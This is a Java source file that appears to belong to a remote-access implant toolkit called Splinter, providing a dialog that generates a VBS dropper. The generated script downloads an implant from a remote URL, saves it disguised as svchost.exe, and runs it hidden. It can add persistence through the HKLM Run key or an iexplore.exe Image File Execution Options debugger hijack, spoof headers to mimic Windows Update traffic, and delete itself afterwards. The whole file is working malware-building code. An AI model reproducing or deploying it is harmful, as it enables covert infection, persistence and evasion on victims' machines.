/**
 * This Dialog frame presents a user interface to specify the parameters to create a VBS script to download the true Splinter implant and install it to infect the machine
 * 
 * 
 * @author Solomon Sonya
 */



package Controller.GUI;

import Controller.Drivers.Drivers;
import Implant.*;

import java.awt.BorderLayout;
import java.awt.GridLayout;
import java.awt.event.*;
import java.awt.*;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;

import javax.swing.*;


public class Dialog_DropperVBS extends JDialog implements ActionListener
{
	public static final String strMyClassName = "Dialog_DropperVBS";
	
	JPanel jpnlOptions = new JPanel(new GridLayout(24,1));
	
	JPanel_Text_And_JTextField implantSavePath = new JPanel_Text_And_JTextField("Implant Save Path on Host:", "%USERPROFILE%\\Desktop");
	JPanel_Text_And_JTextField implantName = new JPanel_Text_And_JTextField("Implant Name on Host:", "svchost.exe");
	JPanel_Text_And_JTextField implantDownloadURL = new JPanel_Text_And_JTextField("Implant Download URL:", "http://192.168.0.100");
	JPanel_Text_And_JTextField implantDownloadNameOnServer = new JPanel_Text_And_JTextField("Implant Download Name on Server:", "update");
	JPanel_Text_And_JTextField implantExecutionArguments = new JPanel_Text_And_JTextField("Implant Execution Arguments:", "-i [URL to Controller] [Port]");
	
	JPanel_Text_And_JTextField implantDownloadParameters = new JPanel_Text_And_JTextField("Implant Download  Parameters:", "- - -");
	JPanel_Text_And_JTextField implantSaveParameters = new JPanel_Text_And_JTextField("Implant Save  Parameters:", "- - -");
	JPanel_Text_And_JTextField implantExecutionParameters = new JPanel_Text_And_JTextField("Implant Execution Parameters:", "- - -");
	JPanel_Text_And_JTextField registryArguments_Check = new JPanel_Text_And_JTextField("Registry Arguments:", "- - -");
	JPanel_Text_And_JTextField registryArguments_StringName = new JPanel_Text_And_JTextField("Registry String Name:", "Windows Update Check");
	
	JPanel_Text_And_JTextField header_Accept = new JPanel_Text_And_JTextField("[URL Header] \"Accept\" : ", "text/html, application/xhtml+xml, */*");
	JPanel_Text_And_JTextField header_Referer = new JPanel_Text_And_JTextField("[URL Header] \"Referer\" : ", "http://www.microsoft.com/");
	JPanel_Text_And_JTextField header_Accept_Language = new JPanel_Text_And_JTextField("[URL Header] \"Accept-Language\" : ", "en-US");
	JPanel_Text_And_JTextField header_User_Agent = new JPanel_Text_And_JTextField("[URL Header] \"User-Agent\" : ", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)");
	JPanel_Text_And_JTextField header_Accept_Encoding = new JPanel_Text_And_JTextField("[URL Header] \"Accept-Encoding\" : ", "gzip, deflate");
	JPanel_Text_And_JTextField header_Host = new JPanel_Text_And_JTextField("[URL Header] \"Host\" : ", "www.windowsupdate.com");
	JPanel_Text_And_JTextField header_DNT = new JPanel_Text_And_JTextField("[URL Header] \"DNT\" : ", "1");
	JPanel_Text_And_JTextField header_Connection = new JPanel_Text_And_JTextField("[URL Header] \"Connection\" : ", "Keep-Alive");
	JPanel_Text_And_JTextField header_Cookie = new JPanel_Text_And_JTextField("[URL Header] \"Cookie\" : ", "" + System.currentTimeMillis()*1000000 + "; " + System.currentTimeMillis()*10000);
	
	JPanel jpnlPersistence = new JPanel(new GridLayout(1,2));
	JCheckBox jcbPersistence_Restart = new JCheckBox("Establish Restart Persistence");
	JCheckBox jcbPersistence_IExplore = new JCheckBox("Establish IExplore Persistence");
	
	JCheckBox jcbDeleteDropper = new JCheckBox("Delete Dropper After Execution");
	
	JPanel jpnlMalwareExistsAtLocation = new JPanel();
		JLabel jlblMalwareExistsAtLocation = new JLabel("Action if Malware Exists at Location: ");
		JRadioButton jrbOverwrite = new JRadioButton("Overwrite (if possible)", false);
		JRadioButton jrbDeleteDropper = new JRadioButton("Delete Dropper (if possible)", false);
		JRadioButton jrbExitScript = new JRadioButton("Close Dropper Script (recommended)", true);
		ButtonGroup bgMalwareExists = new ButtonGroup();
		
	JCheckBox jcbSpoofHeader = new JCheckBox("Spoof Header");
	
	JPanel jpnlButtons = new JPanel();
		JButton jbtnCheck = new JButton("Check");
		JButton jbtnExport = new JButton("Export");
		JButton jbtnCancel = new JButton("Cancel");
	
	public Dialog_DropperVBS()
	{
		try
		{
			this.setTitle("Select Components");
			
			getContentPane().setLayout(new BorderLayout());
			this.setTitle("VBS Droper");
			this.setBounds(300, 100, 750, 700);
			this.setResizable(false);
			
			this.setModaling();
			Drivers.setJFrameIcon(this);
			
			getContentPane().add(BorderLayout.CENTER, jpnlOptions);
			
			jpnlOptions.add(implantDownloadURL);
			jpnlOptions.add(implantDownloadNameOnServer);
			jpnlOptions.add(implantDownloadParameters);
			
			jpnlOptions.add(implantSavePath);
			jpnlOptions.add(implantName);
			jpnlOptions.add(implantExecutionArguments);
			
			
			jpnlOptions.add(implantSaveParameters);
			jpnlOptions.add(implantExecutionParameters);
			
			jpnlPersistence.add(jcbPersistence_Restart);
			jcbPersistence_IExplore.setEnabled(false);
			jpnlPersistence.add(this.jcbPersistence_IExplore);
			
			jpnlOptions.add(jpnlPersistence);
			
			jpnlOptions.add(registryArguments_StringName);
			jpnlOptions.add(registryArguments_Check);
			
			jpnlMalwareExistsAtLocation.add(jlblMalwareExistsAtLocation);
			jpnlMalwareExistsAtLocation.add(jrbExitScript);
			jpnlMalwareExistsAtLocation.add(jrbDeleteDropper);
			//jpnlMalwareExistsAtLocation.add(jrbOverwrite);			
			bgMalwareExists.add(this.jrbExitScript);
			bgMalwareExists.add(this.jrbOverwrite);
			bgMalwareExists.add(this.jrbDeleteDropper);
			jpnlOptions.add(jpnlMalwareExistsAtLocation);
			
			
			
			jpnlOptions.add(jcbSpoofHeader);
			jpnlOptions.add(header_Accept);
			jpnlOptions.add(header_Referer);
			jpnlOptions.add(header_Accept_Language);
			jpnlOptions.add(header_User_Agent);
			jpnlOptions.add(header_Accept_Encoding);
			jpnlOptions.add(header_Host);
			jpnlOptions.add(header_DNT);
			jpnlOptions.add(header_Connection);
			jpnlOptions.add(header_Cookie);
			
			jpnlOptions.add(jcbDeleteDropper);
			
			jpnlButtons.add(this.jbtnCheck);
			jpnlButtons.add(this.jbtnExport);
			jpnlButtons.add(this.jbtnCancel);
				jpnlOptions.add(jpnlButtons);
				
			jbtnExport.addActionListener(this);
			jbtnCancel.addActionListener(this);
			jbtnCheck.addActionListener(this);
			this.jcbSpoofHeader.addActionListener(this);
			jcbPersistence_Restart.addActionListener(this);
			jcbPersistence_IExplore.addActionListener(this);
			
			implantDownloadParameters.jtf.setEditable(false);
			implantExecutionParameters.jtf.setEditable(false);
			implantSaveParameters.jtf.setEditable(false);
			registryArguments_Check.jtf.setEditable(false);
			
			header_Accept.jtf.setEditable(jcbSpoofHeader.isSelected());
			header_Referer.jtf.setEditable(jcbSpoofHeader.isSelected());
			header_Accept_Language.jtf.setEditable(jcbSpoofHeader.isSelected());
			header_User_Agent.jtf.setEditable(jcbSpoofHeader.isSelected());
			header_Accept_Encoding.jtf.setEditable(jcbSpoofHeader.isSelected());
			header_Host.jtf.setEditable(jcbSpoofHeader.isSelected());
			header_DNT.jtf.setEditable(jcbSpoofHeader.isSelected());
			header_Connection.jtf.setEditable(jcbSpoofHeader.isSelected());
			header_Cookie.jtf.setEditable(jcbSpoofHeader.isSelected());
			registryArguments_StringName.jtf.setEditable(jcbPersistence_Restart.isSelected());
			
		}
		catch(Exception e)
		{
			Driver.eop("Constructor", strMyClassName, e, "", false);
		}
	}

	
	
	public boolean setModaling()
	{
		try
		{
			
			this.setModal(true);
			this.setAlwaysOnTop(true);
			this.setModalityType (ModalityType.APPLICATION_MODAL);
			
			return true;
		}
		catch(Exception ee){Driver.sop("in " + strMyClassName + " could not set modaling");}
		
		return false;
	}
	
	
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == jbtnCheck)
			{
				validateForm();
			}
			
			else if(ae.getSource() == this.jbtnCancel)
			{
				this.dispose();
			}
			
			else if(ae.getSource() == this.jbtnExport)
			{
				if(validateForm())
				{
					exportScript();
				}
				else
				{
					Drivers.jop_Error("Invalid Input in Dropper Form", "Unable to Complete Selected Action");
				}
			}
			
			else if(ae.getSource() == this.jcbSpoofHeader)
			{
				header_Accept.jtf.setEditable(jcbSpoofHeader.isSelected());
				header_Referer.jtf.setEditable(jcbSpoofHeader.isSelected());
				header_Accept_Language.jtf.setEditable(jcbSpoofHeader.isSelected());
				header_User_Agent.jtf.setEditable(jcbSpoofHeader.isSelected());
				header_Accept_Encoding.jtf.setEditable(jcbSpoofHeader.isSelected());
				header_Host.jtf.setEditable(jcbSpoofHeader.isSelected());
				header_DNT.jtf.setEditable(jcbSpoofHeader.isSelected());
				header_Connection.jtf.setEditable(jcbSpoofHeader.isSelected());
				header_Cookie.jtf.setEditable(jcbSpoofHeader.isSelected());
			}
			
			else if(ae.getSource() == jcbPersistence_Restart)
			{
				this.registryArguments_StringName.jtf.setEditable(jcbPersistence_Restart.isSelected());
			}
			
			
		}
		catch(Exception e)
		{
			Driver.eop("AE", strMyClassName, e, "", false);
		}
	}
	
	public boolean exportScript()
	{
		try
		{
			//since the validation is complete, we just take the parameters from the form and write out to disk!
			File fleOut = Drivers.querySelectFile(false, "Please select location to save Dropper Script", JFileChooser.DIRECTORIES_ONLY, false, false);
			
			if(fleOut == null)
			{
				Drivers.jop_Error("Invalid Selection                                     ", "Unable to Complete Selected Action");
				return false;
			}
			
			//otherwise, begin writing to script!
			File fleDropper = null;
			String dropperName = "" + System.currentTimeMillis() + "_Dropper.vbs";
			
			//overwrite if it exists for now...
			
			if(fleOut.getCanonicalPath().endsWith(Driver.fileSeperator))
				fleDropper = new File(fleOut.getCanonicalPath() + dropperName);
			else
				fleDropper = new File(fleOut.getCanonicalPath() + Driver.fileSeperator + dropperName);
			
			
			PrintWriter pwOut = new PrintWriter(new BufferedOutputStream(new FileOutputStream(fleDropper)));
			
			//
			//Header
			//
			pwOut.println("'" + Driver.TITLE + " VBS Dropper Script Created " + Driver.getTimeStamp_Updated() + "\n\n");
			pwOut.println("");
			
			pwOut.println("set tempShell = CreateObject(\"WScript.Shell\")");
			
			//
			//Temp Save Location
			//
			String outLocation = this.implantSavePath.getText();
			String savePath = "";
			
			if(outLocation != null && outLocation.startsWith("%"))
			{
				//Environment Var used, convert into VBS language
				String arr [] = outLocation.split("%");
				
				Drivers.sop("Note: only works for the first environment variable found for now");
				
				savePath = "tempShell.ExpandEnvironmentStrings(\"%" + arr[1] + "%\")" + " + \"" + arr[2] + "";
				
				pwOut.println("malwareSavePath = " + savePath + "\\" + this.implantName.getText()+ "\"");
			}
			else
			{
				//No environment path, simply write contents out to disk
				pwOut.println("malwareSavePath = " + "\"" + this.implantSaveParameters.getText().trim() + "\"");
			}
			
			pwOut.println("tempPath  = tempShell.ExpandEnvironmentStrings(\"%TEMP%\")");
			pwOut.println("appData  = tempShell.ExpandEnvironmentStrings(\"%LOCALAPPDATA%\")");
			pwOut.println("hotfix = tempShell.ExpandEnvironmentStrings(\"%windir%\") + " + "\"\\softwaredistribution\\download\"");
			
			//
			//Save to the Registry if enabled
			//
			if(this.jcbPersistence_Restart.isSelected())
			{
				pwOut.println("");
				pwOut.println("");
				pwOut.println("\t'write to registry for persistence");
				
				pwOut.println("\tConst HKEY_LOCAL_MACHINE = &H80000002");
				pwOut.println("\tthisComputer = \".\" ");
				pwOut.println("\tSet objRegistry=GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\" & thisComputer & \"\\root\\default:StdRegProv\")");
				pwOut.println(" ");
				pwOut.println("\tstrKeyPath = \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"");
				pwOut.println("\tstrValueName = \"" + this.registryArguments_StringName.getText().trim() + "\"");
				pwOut.println("\tstrValue = " + "\"\"\"" + this.implantSaveParameters.getText().trim() + "\"\"\"" + " + \" " + this.implantExecutionArguments.getText().trim() + "\"");   
				pwOut.println("\tobjRegistry.SetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue");
				
				pwOut.println("");
				
			}
			
			//
			//Save to the Registry - IExplore Persistence if enabled
			//
			if(this.jcbPersistence_IExplore.isSelected())
			{
				pwOut.println("");
				pwOut.println("");
				pwOut.println("\t'write to registry IExplorer Debug for persistence");
				
				pwOut.println("\tConst HKEY_LOCAL_MACHINE = &H80000002");
				pwOut.println("\tthisComputer = \".\" ");
				pwOut.println("\tSet objRegistry=GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\" & thisComputer & \"\\root\\default:StdRegProv\")");
				pwOut.println(" ");
				pwOut.println("\tstrKeyPath = \"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution\\iexplore.exe\"");
				pwOut.println("\tstrValueName = \"" + "Debugger" + "\"");
				pwOut.println("\tstrValue = " + "\"\"\"" + this.implantSaveParameters.getText().trim() + "\"\"\"" + " + \" " + this.implantExecutionArguments.getText().trim() + " -e iexplore" + "\"");   
				pwOut.println("\tobjRegistry.SetStringValue HKEY_LOCAL_MACHINE,strKeyPath,strValueName,strValue");
				
				pwOut.println("");
				
			}
			
			//
			//Save Malware
			//
			pwOut.println("");
			
			//exit script if malware already exists
			if(this.jrbExitScript.isSelected())
			{
				pwOut.println("'first ensure file does not already exist");
				pwOut.println("Set objFSO = CreateObject(\"Scripting.FileSystemObject\")");
				pwOut.println("");
				pwOut.println("'Drop Binary at specified location");
				pwOut.println("");
				pwOut.println("\tIf objFSO.FileExists (malwareSavePath) Then");
				pwOut.println("\t\twscript.quit");
				pwOut.println("\tend if");
				pwOut.println("");
				
			}
			
			//delete script if malware already exists
			if(this.jrbDeleteDropper.isSelected())
			{
				pwOut.println("\t'first ensure file does not already exist");
				pwOut.println("\tSet objFSO = CreateObject(\"Scripting.FileSystemObject\")");								
				pwOut.println("");
				pwOut.println("\tIf objFSO.FileExists (malwareSavePath) Then");
				pwOut.println("\t\t'Implant appears to exist at location, therefore delete the script and exit");
				pwOut.println("\t\tSet objSelf = CreateObject(\"Scripting.FileSystemObject\")");
				pwOut.println("\t\tstrSelf = Wscript.ScriptFullName");
				pwOut.println("\t\tobjSelf.DeleteFile(strSelf)");
				pwOut.println("\t\tWscript.Quit");				
				pwOut.println("\tend if");
				pwOut.println("");				
			}
			
			//Download and Save Imlant
			pwOut.println("");

			pwOut.println("'made it here, download and execute implant!");
			pwOut.println("Set shell = CreateObject(\"WScript.Shell\")");
			pwOut.println("");
			
			pwOut.println("'Save Settings");
			pwOut.println("\tstrFileURL = " + "\"" + this.implantDownloadParameters.getText() + "\"");
			pwOut.println("\tstrHDLocation = malwareSavePath");
			
			pwOut.println("");
			pwOut.println("'Download File!");
			pwOut.println("\tSet objXMLHTTP = CreateObject(\"MSXML2.XMLHTTP\")");
			pwOut.println("\tobjXMLHTTP.open \"GET\", strFileURL, false");
			
			//
			//Place Spoof Header Here
			//
			if(this.jcbSpoofHeader.isSelected())
			{
				pwOut.println("");
				pwOut.println("'add some header data, this can potential fool the casual observer");
				pwOut.println(" objXMLHTTP.setRequestHeader \"Accept\", \"" + this.header_Accept.getText().trim() + "\"");
				pwOut.println(" objXMLHTTP.setRequestHeader \"Referer\", \"" + this.header_Referer.getText().trim() + "\"");
				pwOut.println(" objXMLHTTP.setRequestHeader \"Accept-Language\", \"" + this.header_Accept_Language.getText().trim() + "\"");
				pwOut.println(" objXMLHTTP.setRequestHeader \"User-Agent\", \"" + this.header_User_Agent.getText().trim() + "\"");
				pwOut.println(" objXMLHTTP.setRequestHeader \"Accept-Encoding\", \"" + this.header_Accept_Encoding.getText().trim() + "\"");
				pwOut.println(" objXMLHTTP.setRequestHeader \"Host\", \"" + this.header_Host.getText().trim() + "\"");
				pwOut.println(" objXMLHTTP.setRequestHeader \"DNT\", \"" + this.header_DNT.getText().trim() + "\"");
				pwOut.println(" objXMLHTTP.setRequestHeader \"Connection\", \"" + this.header_Connection.getText().trim() + "\"");
				pwOut.println(" objXMLHTTP.setRequestHeader \"Cookie\", \"" + this.header_Cookie.getText().trim() + "\"");				
				pwOut.println("");
			}			

			//
			//EXECUTE
			//
			pwOut.println("");
			pwOut.println("\tobjXMLHTTP.send()");
			pwOut.println("");
			
			//
			//LAUNCH IF GOOD FILE RECEIVED
			//
			pwOut.println("If objXMLHTTP.Status = 200 Then");
			pwOut.println("\tSet objADOStream = CreateObject(\"ADODB.Stream\")");
			pwOut.println("\tobjADOStream.Open");
			pwOut.println("\tobjADOStream.Type = 1 'adTypeBinary");
			pwOut.println("\tobjADOStream.Write objXMLHTTP.ResponseBody");
			pwOut.println("\tobjADOStream.Position = 0");
			
			pwOut.println("\tSet objFSO = Createobject(\"Scripting.FileSystemObject\")");
			pwOut.println("\t\tIf objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation");
			pwOut.println("\tSet objFSO = Nothing");
			
			pwOut.println("\tobjADOStream.SaveToFile strHDLocation");
			pwOut.println("\tobjADOStream.Close");
			pwOut.println("\tSet objADOStream = Nothing");
			pwOut.println("End if");
			
			pwOut.println("\tSet objXMLHTTP = Nothing");
			
			//
			//EXECUTE SAVED MALWARE
			//
			pwOut.println("");
			pwOut.println("'execute malware if it exists now, use ,false parameter in shell.run to specify this script should not wait after invoking the command, so continue down here and close!");
			pwOut.println("Set searchForMalware = CreateObject(\"Scripting.FileSystemObject\")");
			pwOut.println(" If searchForMalware.FileExists (malwareSavePath) Then");
			pwOut.println("\tshell.Run \"\" + malwareSavePath + " + "\" " + this.implantExecutionArguments.getText().trim() + "\"" + ", 0, false");			
			pwOut.println(" end if");
			
			//
			//Delete Dropper!
			//
			pwOut.println("");
			
			if(jcbDeleteDropper.isSelected())
			{
				pwOut.println("'deleting self now...");
				pwOut.println("Set objSelf = CreateObject(\"Scripting.FileSystemObject\")");
				pwOut.println("strSelf = Wscript.ScriptFullName");
				pwOut.println("objSelf.DeleteFile(strSelf)");
			}
			
			
			
					
			pwOut.println("");
			
			pwOut.println("Wscript.Quit");
			pwOut.println("\n\n'Source: http://serverfault.com/questions/29707/download-file-from-vbscript");
			
			
			pwOut.flush();
			pwOut.flush();
			pwOut.close();
			
			Drivers.jop("Export Successful\n Dropper Location: " + fleDropper.getCanonicalPath());
			
			Driver.sop("\n* * * Dropper Successfully written to " + fleDropper.getCanonicalPath());
			
			jbtnCancel.setText("Close");
			jbtnCancel.setBackground(Color.red);
			
			//this.dispose();
			return true;
		}
		catch(Exception e)
		{
			//Drivers.eop("exportScript", strMyClassName, e, "", false);
			Driver.sop("Errors found on Form.  Unable to continue...");
			
		}
		
		this.dispose();
		
		return false;
	}
	
	public boolean validateForm()
	{
		try
		{
			implantDownloadParameters.setText(implantDownloadURL.getText().trim() + "/" + this.implantDownloadNameOnServer.getText().trim());
			implantExecutionParameters.setText(this.implantName.getText().trim() + " " + this.implantExecutionArguments.getText().trim());
			implantSaveParameters.setText(this.implantSavePath.getText().trim() + "\\" + implantName.getText().trim());
			registryArguments_Check.setText("Value Name: " + this.registryArguments_StringName.getText().trim()  + "  Type: REG_SZ  "  + "Value Location: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" + "  Data: \"" + this.implantSaveParameters.getText().trim() + "\"" + this.implantExecutionArguments.getText().trim());
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("validateForm", strMyClassName, e, "", false);
		}
		
		return false;
	}
	
}
